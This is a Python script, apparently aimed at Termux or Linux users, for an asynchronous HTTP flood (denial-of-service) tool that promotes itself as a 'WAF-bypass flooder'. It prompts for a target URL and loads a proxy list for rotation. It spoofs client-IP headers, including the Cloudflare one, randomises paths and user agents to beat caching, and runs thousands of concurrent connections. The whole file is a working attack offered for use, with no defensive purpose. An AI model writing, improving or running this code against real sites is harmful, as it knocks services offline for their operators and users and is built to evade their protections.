# language: Python 3, file: hyper_flood.py, target: Termux / Linux
# Requirements: pip install aiohttp aiohttp_socks
# High-concurrency Asynchronous HTTP Flooder with Proxy Rotation and Payload Smuggling.

import asyncio
import aiohttp
import aiohttp_socks
import random
import sys
import time
import os
import urllib.parse

# --- UI CONFIG ---
R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
C = '\033[96m'
W = '\033[0m'
BOLD = '\033[1m'

BANNER = f"""{R}{BOLD}
 ██░ ██▓▓██   ██▓ ██▓███  ▓█████  ██▀███      █████▒██▓     ▒█████   ▒█████  ▓█████▄ 
▓██░ ██▒ ▒██  ██▒▓██░  ██▒▓█   ▀ ▓██ ▒ ██▒  ▓██   ▒▓██▒    ▒██▒  ██▒▒██▒  ██▒▒██▀ ██▌
▒██▀▀██░  ▒██ ██░▓██░ ██▓▒▒███   ▓██ ░▄█ ▒  ▒████ ░▒██░    ▒██░  ██▒▒██░  ██▒░██   █▌
░▓█ ░██   ░ ▐██▓░▒██▄█▓▒ ▒▒▓█  ▄ ▒██▀▀█▄    ░▓█▒  ░▒██░    ▒██   ██░▒██   ██░░▓█▄   ▌
░▓█▒░██▓  ░ ██▒▓░▒██▒ ░  ░░▒████▒░██▓ ▒██▒  ░▒█░   ░██████▒░ ████▓▒░░ ████▓▒░░▒████▓ 
 ▒ ░░▒░▒   ██▒▒▒ ▒▓▒░ ░  ░░░ ▒░ ░░ ▒▓ ░▒▓░   ▒ ░   ░ ▒░▓  ░░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒▒▓  ▒ 
 ▒ ░▒░ ░ ▓██ ░▒░ ░▒ ░     ░ ░  ░  ░▒ ░ ▒░   ░     ░ ░ ▒  ░  ░ ▒ ▒░   ░ ▒ ▒░  ░ ▒  ▒ 
 ░  ░░ ░ ▒ ▒ ░░  ░░         ░     ░░   ░    ░ ░     ░ ░     ░ ░ ░ ▒    ░ ░ ░ ▒   ░ ░  ░ 
 ░  ░  ░ ░ ░       ░         ░  ░   ░              ░  ░        ░ ░        ░ ░     ░    
{W}{C}           [ ASYNCHRONOUS WAF-BYPASS FLOODER v2.0 ]{W}
"""

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1"
]

PATHS = ["/", "/api/", "/login", "/graphql", "/wp-json/", "/search?q=", "/?s=", "/assets/main.js", "/index.php", "/.env"]

# สถิติแบบ Global
stats = {"sent": 0, "success": 0, "failed": 0, "proxies_used": 0}
running = True

async def flood_worker(session, target, proxy_pool):
    global stats
    while running:
        # สุ่ม Proxy จาก Pool (ถ้ามี)
        proxy = None
        if proxy_pool and random.random() > 0.1: # 10% ยิงตรง ไม่ผ่าน proxy
            proxy = random.choice(proxy_pool)
            stats["proxies_used"] += 1
            
        # สุ่ม Path และ Parameter กัน Cache
        path = random.choice(PATHS) + str(random.randint(1000, 99999))
        url = target + path

        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Cache-Control": "no-cache, no-store, must-revalidate",
            "Pragma": "no-cache",
            "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "X-Real-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "CF-Connecting-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        }

        try:
            # ใช้ HTTP/2 ถ้าทำได้, ถ้าไม่ได้ก็ใช้ 1.1
            async with session.get(url, headers=headers, proxy=proxy, ssl=False) as response:
                await response.read() # อ่านข้อมูลเพื่อให้ Connection สมบูรณ์
                if response.status < 400:
                    stats["success"] += 1
                else:
                    stats["failed"] += 1
        except Exception:
            stats["failed"] += 1
        
        stats["sent"] += 1

async def main():
    global running
    os.system('clear')
    print(BANNER)
    
    target = input(f"{C}[?] Target URL (e.g., https://target.com): {W}").strip()
    if not target.startswith('http'):
        target = 'https://' + target
    
    # โหลด Proxy
    proxy_pool = []
    if os.path.exists("proxies.txt"):
        with open("proxies.txt", "r") as f:
            for line in f:
                p = line.strip()
                if p:
                    if "://" not in p:
                        p = "http://" + p
                    proxy_pool.append(p)
        print(f"{G}[+] Loaded {len(proxy_pool)} proxies.{W}")
    else:
        print(f"{Y}[!] proxies.txt not found. Running direct (WAF will block you fast).{W}")

    try:
        concurrency = int(input(f"{C}[?] Concurrency (max connections, e.g., 2000): {W}").strip())
    except ValueError:
        concurrency = 1000

    print(f"\n{G}[+] Initializing Async Engine...{W}")
    print(f"{G}[+] Concurrency: {concurrency} | Target: {target}{W}")
    print(f"{R}[!] FIRE IN THE HOLE...{W}\n")

    # ตั้งค่า Connector ให้รีด Connection สูงสุด
    connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300, use_dns_cache=True, ssl=False)
    
    # Timeout สั้นๆ เพื่อไม่ให้ค้าง
    timeout = aiohttp.ClientTimeout(total=5, connect=2)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout, trust_env=True) as session:
        # สร้าง Workers
        workers = [asyncio.create_task(flood_worker(session, target, proxy_pool)) for _ in range(concurrency)]
        
        start_time = time.time()
        
        # UI Update Loop
        while running:
            await asyncio.sleep(0.1)
            elapsed = time.time() - start_time
            rps = stats["sent"] / elapsed if elapsed > 0 else 0
            
            sys.stdout.write(
                f"\r{R}[◉] SENT:{W} {stats['sent']} "
                f"{R}| OK:{W} {stats['success']} "
                f"{R}| ERR:{W} {stats['failed']} "
                f"{R}| RPS:{Y} {int(rps)} "
                f"{R}| PROXY:{C} {stats['proxies_used']} {W}   "
            )
            sys.stdout.flush()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        running = False
        print(f"\n\n{R}[!] TERMINATED. FINAL STATS: {W}")
        print(f"    Total Requests Sent: {G}{stats['sent']}{W}")
        print(f"    Successful: {G}{stats['success']}{W}")
        print(f"    Failed: {R}{stats['failed']}{W}")
        sys.exit(0)